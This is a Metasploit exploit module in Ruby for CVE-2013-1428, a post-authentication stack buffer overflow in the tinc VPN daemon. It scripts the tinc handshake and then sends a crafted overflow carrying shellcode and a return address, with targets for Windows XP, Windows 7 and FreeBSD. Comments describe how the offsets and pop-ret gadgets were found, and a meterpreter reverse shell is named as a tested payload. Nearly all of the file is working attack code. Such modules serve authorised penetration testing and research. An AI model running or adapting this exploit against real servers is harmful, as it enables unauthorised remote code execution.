##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
# 

require 'msf/core'
require 'securerandom'
require 'openssl'
require 'digest/sha1'
require 'rex/socket'

class TincExploitClient
  
  #PROGRAM flow:
  #1. SYN, SYN/ACK, ACK - further TCP ACK's are not included
  #2. ID, client PSH: "0 testnode2 17.0"
  #3. ID, server PSH: "0 testnode2 17.0"
  #4. Metakey, client PSH: "1 94 64 0 0 VALUE_1"
  #5. Metakey, server PSH: "1 94 64 0 0 VALUE_2"
  #6. Receive Challenge from server, server PSH: 515 bytes - 3f8a4c...
  #7. Send Challenge to server, client PSH: 520 bytes - cdca80...
  #8. Challenge Reply to server, client PSH: 48 bytes - c2f415...
  #9. Challenge Reply from server, server PSH: 43 bytes - d34d78...
  #10. ACK of client, client PSH: 16 bytes - 7ffca1...
  #11. ACK part1 of server, server PSH: 11 bytes - 93fdcf...
  #12. ACK part2 of server, server PSH: 69 bytes - e6051a...
  #13. attack, client PSH: payload - 9d6a94...
  
  def initialize(server_file, client_file, client_name, payload, host, tcp_port)
    @state = "id"
    @buffer = ""
    @inbuffer = ""
    @encryption_queue = []
    @decryption_queue = ""
    @socket = nil
    
    @keepReadingSocket = true
    
    @client_name = client_name

    @host = host
    @tcp_port = tcp_port
    @payload = payload

    #IMPORTANT: This class is untested with other lengths
    @bfblocksize =  64/8
    @key_len = 256
    puts "Assuming Blowfish blocksize of %d and challenge (key) length of %d" % [@bfblocksize, @key_len]
    
    @client_private_key_cipher = nil
    @hex_enc_key_S1 = nil
    @bf_enc_cipher = nil
    self.initCiphers(server_file, client_file)
    puts "Ciphers locally initalized, private key and public key files seem to be ok"
    @bf_dec_cipher = nil
  end
  
  def exploit()
    begin
      @socket = TCPSocket.open(@host, @tcp_port)
    rescue Errno::ECONNREFUSED => e
      puts "Can not connect (port closed?). Aborting."
      return
    end
    begin
      self.id() #send the first message
      while @keepReadingSocket
        data = @socket.recv(1024)
        self.receive_data(data)
      end
      @socket.close
    rescue Errno::ECONNRESET => e
      if @state == "metakey"
        puts "Server reset the connection. Probably rejecting the private "\
        "key and/or client name (e.g. client name not associated with client public key on server side). "\
        "Wrong server public key possible too. "\
        "Please recheck client name, client private key and server public key."
      else
        puts "Server reset the connection, reason unknown."
      end
    end
  end
  
  def initCiphers(server_file, client_file)
    server_public_key_cipher = OpenSSL::PKey::RSA.new(File.read(server_file))
    @client_private_key_cipher = OpenSSL::PKey::RSA.new(File.read(client_file))

    encryptionSuccessful = false
    while not encryptionSuccessful
      begin
        key_S1 = SecureRandom.random_bytes(@key_len)
        #can happen here:
        #`public_encrypt': data too large for modulus (OpenSSL::PKey::RSAError)
        enc_key_S1 = server_public_key_cipher.public_encrypt(key_S1, OpenSSL::PKey::RSA::NO_PADDING)
        encryptionSuccessful = true
      rescue OpenSSL::PKey::RSAError => e
        #the while loop will take care
      end
    end
    
    @hex_enc_key_S1 = enc_key_S1.unpack("H*")[0]
    
    # setup encryption
    bf_enc_key = key_S1[240...256]
    bf_enc_iv = key_S1[232...240]
    
    @bf_enc_cipher = OpenSSL::Cipher::Cipher.new("BF-OFB")
    @bf_enc_cipher.encrypt
    @bf_enc_cipher.key = bf_enc_key
    @bf_enc_cipher.iv = bf_enc_iv
    
    ##Looks like ruby openssl supports other lengths than multiple of 8!
    #test = @bf_enc_cipher.update("A"*10)
    #test << @bf_enc_cipher.final
    #puts "Testing cipher: "+test.unpack("H*")[0]
  end

  def receive_data(data)
    @inbuffer += data
    if @state == "id"
      if(self.has_line())
        data = self.get_line()
        puts "Received ID from server: [%s]" % (data[0..30])
        @state = "metakey" #next expected state
        self.metakey()
      end           
    end
    if @state == "metakey"
      if self.has_line()
        data = get_line()
        puts "Received Metakey from server: [%s...]" % (data[0..30])
        data = data.split(" ")
        raise "Error in protocol. The first byte should be an ASCII 1." unless data[0] == "1"
        hexkey_S2 = data[5].rstrip #("\n")
        raise "Error in protocol. hexkey_S2 length should be %d." % @key_len*2 unless hexkey_S2.length == @key_len*2
        @enckey_S2 = [hexkey_S2].pack("H*")
        key_S2 = @client_private_key_cipher.private_decrypt(@enckey_S2, OpenSSL::PKey::RSA::NO_PADDING)

        # setup decryption
        bf_dec_key = key_S2[240..256]
        bf_dec_iv = key_S2[232..240]

        @bf_dec_cipher = OpenSSL::Cipher::Cipher.new "BF-OFB"
        @bf_dec_cipher.encrypt
        @bf_dec_cipher.key = bf_dec_key
        @bf_dec_cipher.iv = bf_dec_iv
        #OFB mode: don't forget, it does matter if you do a 
        #@bf_dec_cipher.reset or not, but DON'T BECAUSE IT BREAKS STUFF :D
        puts "Crypto handshake/exchange completed"
        @state = "challenge"
        self.challenge()
      end
    end

    if @state == "challenge"
      need_len = 515
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        puts "Received challenge from server: [%s...]" % data.unpack("H*")[0][0..30]
        data = data.split(" ", 2)
        raise "Error in protocol. The first byte should be an ASCII 2." unless data[0] == "2"
        challenge2 = data[1][0...512]
        challenge2 = [challenge2].pack("H*")
        raise "Error in protocol. challenge2 length should be %d." % @key_len unless challenge2.length == @key_len
        @state = "challenge_reply"
        self.challenge_reply(challenge2)
      end
    end

    if @state == "challenge_reply"
      need_len = 43
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        puts "Received challenge reply from server: [%s...]" % data.unpack("H*")[0][0..30]
        @state = "ack"
        self.ack()
      end
    end

    if @state == "ack"
      need_len = 12
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        puts "Received ack (server accepted challenge response): [%s...]" % data.unpack("H*")[0][0..30]
        @state = "done"
        self.overflow()
      end
    end
  end

  def handle_write()
    #handle encryption queue first
    if @encryption_queue.length > 0
      msg = @encryption_queue[0]
      @encryption_queue.delete_at(0)
      @buffer = @bf_enc_cipher.update(msg)
      @buffer << @bf_enc_cipher.final
      #DON'T DO A @bf_enc_cipher.reset
    end
        
    if @buffer.length > 0
      sent = self.send_data(@buffer)
      puts "Sent %d bytes: [%s...]" % [sent, @buffer.unpack("H*")[0][0..30]]
      @buffer = @buffer[sent..@buffer.length]
    end
  end
  
  def send_data(buf)
    @socket.send(buf,0)
    return buf.length
  end
  
  def pop_inbuffer_and_decrypt(size)
    @decryption_queue = pop_inbuffer(size)
    # In ruby openssl OFM works not only on full blocks, but also on
    # parts. Therefore no worries like in pycrypto and no 
    # modified decrypt routine, simply use the cipher as is.
    data = @bf_dec_cipher.update(@decryption_queue)
    data << @bf_dec_cipher.final
    #DON'T DO A bf_dec_cipher.reset
    @decryption_queue = ""
    return data
  end
  
  def pop_inbuffer(size)
    data = @inbuffer[0...size]
    if size >= @inbuffer.length
      @inbuffer = ""
    else
      @inbuffer = @inbuffer[size+1..@inbuffer.length]
    end
    return data
  end
  
  def get_line()
    idx = @inbuffer.index("\n")
    data = self.pop_inbuffer(idx)
    return data
  end
  
  def has_line()
    if @inbuffer.match("\n")
      return true
    else
      return false
    end
  end
  
  def id()
    msg = "0 %s 17.0\n" % @client_name
    puts "Sending ID (cleartext): [%s]" % msg.gsub("\n","")
    @buffer += msg
    self.handle_write()
  end
      
  def metakey()
    msg = "1 94 64 0 0 %s\n" % (@hex_enc_key_S1)
    puts "Sending metakey (cleartext): [%s...]" % msg[0..30]
    @buffer += msg
    self.handle_write()
  end

  def challenge()
    puts "Sending challenge (ciphertext)"
    challenge = SecureRandom.random_bytes(@key_len)
    msg = "2      %s\n" % (challenge.unpack("H*")[0])
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def challenge_reply(challenge2)
    puts "Sending challenge reply (ciphertext)"
    h = Digest::SHA1.hexdigest(challenge2)
    msg = "3      %s\n" % (h.upcase)
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def ack()
    puts "Sending ack (signalise server that we accept challenge reply, ciphertext)"
    @encryption_queue.push("4 %d 123 0    \n" % (@tcp_port))
    self.handle_write()
  end

  def overflow()
    puts "Protocol setup. Going for exploit (ciphertext). Peng!"
    msg = "17 %d\n%s" % [@payload.length, @payload]
    plen = @bfblocksize - (msg.length % @bfblocksize)
    #padding
    msg += "B" * plen
    @encryption_queue.push(msg)
    puts "Payload is going to be executed"
    @keepReadingSocket = false
    self.handle_write()
  end
end


class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Tincd Post-Authentication Remote TCP Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in Tinc's tincd.exe
				service. After authentication, a specially crafted tcp packet (default port 655)
				leads to a buffer overflow and allows to execute arbitrary code. This module has
				been tested with tinc-1.1pre6 on Windows XP (custom calc payload) and Windows 7 
				(windows/meterpreter/reverse_tcp), and tinc version 1.0.19 from the ports of 
				FreeBSD 9.1-RELEASE #0. The exploit probably works for versions <= 1.1pre6.
				A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to 
				be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd
				was compiled. Bug got fixed in version 1.0.21.
			},
			'Author'         => [ #PoC changes, port python to ruby, exploitation, metasploit module
			                      'Tobias Ospelt <tobias at modzero dot ch>', 
			                      #original finding, python PoC crash
			                      'Martin Schobert <schobert at modzero dot ch>',
			  ],
			'References'     =>
				[
					[ 'CVE', '2013-1428' ],
					[ 'OSVDB', '92653' ],
					[ 'BID', '59369' ],
					[ 'URL', 
					  ['http://www.modzero.ch/', 
					  'http://www.floyd.ch/', 
					  'http://sitsec.net/blog/2013/04/22/stack-based-buffer-overflow-in-the-vpn-software-tinc-for-authenticated-peers/', 
					  'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-1428'
					  ] 
					],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1675,
					'BadChars' => "",
				},
			'Privileged'     => true,
			'Targets'        =>
  				[
  					['Windows XP x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
  					['Windows 7 x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
  					['FreeBSD 9.1-RELEASE #0 x86, tinc 1.0.19 (ports)', { 'Platform' => 'bsd', 'Ret' => 0x0804BABB, 'offset' => 1676 }],
  					['Ubuntu 12.10 x86 (crash only!), tinc 1.1.pre6 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
  					#I'm still writing the ROP for Fedora...
  					#['Fedora 19 x86 ROP (NX), tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x4d10ee87, 'offset' => 1676 }],
  				],
  				
			'DisclosureDate' => 'Apr 22 2013', #finding, msf module: Dec 2013
			'DefaultTarget'  => 0))
		
		register_options(
  		[ Opt::RPORT(655),
  		  OptPath.new('SERVER_PUBLIC_KEY_FILE',  [ true, 'Server\'s public key', '' ]),
  		  OptPath.new('CLIENT_PRIVATE_KEY_FILE', [ true, 'Your client private key', '']),
  		  #As this is a post-auth module, you should know the value of the following variable by simply checking
  		  #your configuration. You should see it in cleartext in the first message to the server by your usual tinc client (tcpdump or
  		  #wireshark it: e.g. "0 home 17.0", so it's "home"). On the server, this is located in the config folder, e.g. in FreeBSD 
  		  #there is the client public key file /usr/local/etc/tinc/hosts/home for the client "home"
  		  #If you don't have a clue, maybe just try the filename of your private key without file extension
  		  OptString.new('CLIENT_NAME', [true, 'Your client name (pre-shared with server)' , '']),
  		], self
  	)
	end


	def exploit
    
    #WINDOWS XP and 7 full exploitation
    #Simple, we only need some mona.py magic
    #C:\Program Files\tinc>"C:\Program Files\Immunity Inc\Immunity Debugger\ImmunityDebugger.exe" "C:\Program Files\tinc\tincd.exe -D -d 5"
    #!mona config -set workingfolder c:\logs\%p
    #!mona pc 1682 
    #  --> C:\logs\tincd\pattern
    #!mona findmsp
    #Straight forward, when we overwrite EIP the second value 
    #on the stack is pointing to our payload.
    #!mona findwild -o -type instr -s "pop r32#ret"
    
    #FREEBSD full exploitation
    #Same offset as windows, same exploitation method
    #But we needed a new pop r32#ret for the freebsd version
    #No mona.py help on linux :( so:
    #- Dumped .text part of tincd binary in gdb
    #- Search in hex editor for opcodes for "pop r32#ret":
    #  58c3, 59c3, ..., 5fc3
    #- Found a couple of 5dc3. ret = start of .text + offset in hex editor
    #- 0x0804BABB works very well
    
    #UBUNTU crash only
    #Manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash, because
    #the bug is in a fixed size (MAXSIZE) struct member variable. The size of the destination is known 
    #at compile time. gcc is introducing a call to __memcpy_chk:
    #http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c
    #memcpy_chk does a __chk_fail call if the destination buffer is smaller than the source buffer. Therefore it will print 
    #*** buffer overflow detected *** and terminate (SIGABRT). The same result for tincd 10.0.19 which can be installed 
    #from the repository. It might be exploitable for versions compiled with an older version of gcc.
    #memcpy_chk seems to be in gcc since 2005: 
    #http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c
    #http://gcc.gnu.org/git/?p=gcc.git;a=history;f=libssp/memcpy-chk.c;hb=92920cc62318e5e8b6d02d506eaf66c160796088

    #FEDORA TODO
    #on Fedora 19 (yum already has fixed tinc 1.0.23 version)
    #wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    #yum install gcc zlib-devel.i686 lzo-devel.i686 openssl-devel.i686 && ./configure && make && make install
    # #hardening-check tincd
    # tincd:
    #  Position Independent Executable: no, normal executable!
    #  Stack protected: no, not found!
    #  Fortify Source functions: no, only unprotected functions found!
    #  Read-only relocations: yes
    #  Immediate binding: no, not found!
    #Looks good for us. Vulnerable because gdb tincd and setting the target of this module to Windows:
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x0041caa6 in ?? ()
    #well and that's our windows offset...
    #executing shellcode (with different offset), but then:
    # (gdb) stepi
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x08e8ee08 in ?? ()
    #Digging deeper we find:
    # dmesg | grep protection
    # [    0.000000] NX (Execute Disable) protection: active
    #other way to see it:
    # # objdump -x /usr/local/sbin/tincd 
    # [...] STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
    #       filesz 0x00000000 memsz 0x00000000 flags rw-
    #I'm writing a ROP chain at the moment...
    
    garbage = "\x90"
    shellcode = payload.encoded+garbage*(target['offset']-payload.encoded.length)+[target.ret].pack('V')
    
    print_status("Payload starts with %s..." % shellcode.unpack("H*")[0][0..30])
    print_status("Initializing tinc exploit client")
    tincClient = TincExploitClient.new(
      datastore['SERVER_PUBLIC_KEY_FILE'], 
      datastore['CLIENT_PRIVATE_KEY_FILE'],
      datastore['CLIENT_NAME'],
      shellcode, 
      datastore['RHOST'], 
      datastore['RPORT']
    )
    print_status("Telling tinc exploit client to exploit")
    tincClient.exploit()
    print_status("Exploit finished")
	end
end